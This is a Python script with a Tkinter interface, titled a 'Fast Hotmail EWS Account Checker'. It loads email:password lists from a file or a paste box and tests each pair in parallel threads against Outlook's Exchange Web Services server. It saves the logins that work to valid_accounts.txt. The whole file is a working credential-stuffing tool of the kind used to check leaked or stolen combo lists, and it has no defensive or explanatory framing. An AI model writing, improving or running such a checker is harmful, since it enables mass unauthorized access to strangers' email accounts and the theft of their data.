import tkinter as tk
from tkinter import filedialog, messagebox, ttk, scrolledtext
import threading
import webbrowser
from exchangelib import Credentials, Account, DELEGATE, Configuration
import time
from concurrent.futures import ThreadPoolExecutor

# Global counts
success_count = 0
failed_count = 0
lock = threading.Lock()

# Function to check login (Runs in parallel)
def check_hotmail_login(email, password):
    try:
        creds = Credentials(email, password)
        config = Configuration(credentials=creds, server='outlook.office365.com')
        account = Account(email, config=config, autodiscover=False, access_type=DELEGATE)
        account.inbox.all().count()  # Test access
        return True
    except Exception:
        return False

# Process accounts with multi-threading
def process_accounts(accounts):
    global success_count, failed_count

    valid_accounts = []
    failed_accounts = []
    total = len(accounts)

    def check_account(index, email, password):
        global success_count, failed_count
        start_time = time.time()
        success = check_hotmail_login(email, password)
        elapsed_time = time.time() - start_time

        with lock:
            if success:
                valid_accounts.append(f"{email}:{password}")
                success_count += 1
                update_progress(f"✅ {email} (Success) [⏳ {elapsed_time:.2f}s]")
            else:
                failed_accounts.append(f"{email}:{password}")
                failed_count += 1
                update_progress(f"❌ {email} (Failed) [⏳ {elapsed_time:.2f}s]")
            update_summary()

    # Run with 10 threads (Adjust for speed)
    with ThreadPoolExecutor(max_workers=10) as executor:
        for index, (email, password) in enumerate(accounts, start=1):
            update_progress(f"🔄 Checking {index}/{total}: {email}...")
            executor.submit(check_account, index, email, password)

    # Save results
    with open("valid_accounts.txt", "w") as f:
        f.write("\n".join(valid_accounts))
    with open("failed_accounts.txt", "w") as f:
        f.write("\n".join(failed_accounts))

    update_progress(f"✅ Process Complete! {success_count} successful, {failed_count} failed.")
    messagebox.showinfo("Done", "Account checking finished!")

# File upload function
def upload_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    with open(file_path, "r") as f:
        accounts = [line.strip().split(":") for line in f.readlines()]
    start_processing(accounts)

# Paste accounts function
def paste_accounts():
    input_text = input_box.get("1.0", tk.END).strip()
    if not input_text:
        messagebox.showwarning("No Input", "Please enter email:password list.")
        return
    accounts = [line.strip().split(":") for line in input_text.split("\n")]
    start_processing(accounts)

# Start processing in a thread
def start_processing(accounts):
    global success_count, failed_count
    success_count = 0
    failed_count = 0
    progress_text.delete("1.0", tk.END)
    summary_label.config(text="✅ 0 Success | ❌ 0 Failed")
    threading.Thread(target=process_accounts, args=(accounts,), daemon=True).start()

# GUI progress update
def update_progress(message):
    progress_text.insert(tk.END, message + "\n")
    progress_text.see(tk.END)

# GUI success/failure count update
def update_summary():
    summary_label.config(text=f"✅ {success_count} Success | ❌ {failed_count} Failed")

# Open valid accounts file
def open_valid_accounts():
    try:
        webbrowser.open("valid_accounts.txt")
    except Exception as e:
        messagebox.showerror("Error", f"Could not open file: {e}")

# Create GUI
def create_gui():
    global root, progress_text, input_box, summary_label
    root = tk.Tk()
    root.title("🔥 Fast Hotmail EWS Account Checker")
    root.geometry("600x500")

    label = tk.Label(root, text="Upload or Paste Accounts (email:password)", font=("Arial", 12))
    label.pack(pady=5)

    frame = tk.Frame(root)
    frame.pack()

    upload_button = tk.Button(frame, text="📂 Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(side=tk.LEFT, padx=10)

    paste_button = tk.Button(frame, text="✂️ Paste Accounts", command=paste_accounts, font=("Arial", 10), bg="lightgreen")
    paste_button.pack(side=tk.LEFT, padx=10)

    input_box = scrolledtext.ScrolledText(root, height=5, width=60)
    input_box.pack(pady=5)

    summary_label = tk.Label(root, text="✅ 0 Success | ❌ 0 Failed", font=("Arial", 12))
    summary_label.pack(pady=5)

    progress_text = scrolledtext.ScrolledText(root, height=12, width=70)
    progress_text.pack(pady=5)

    open_valid_button = tk.Button(root, text="📜 View Successful Logins", command=open_valid_accounts, font=("Arial", 10), bg="lightyellow")
    open_valid_button.pack(pady=5)

    root.mainloop()

# Start GUI
create_gui()
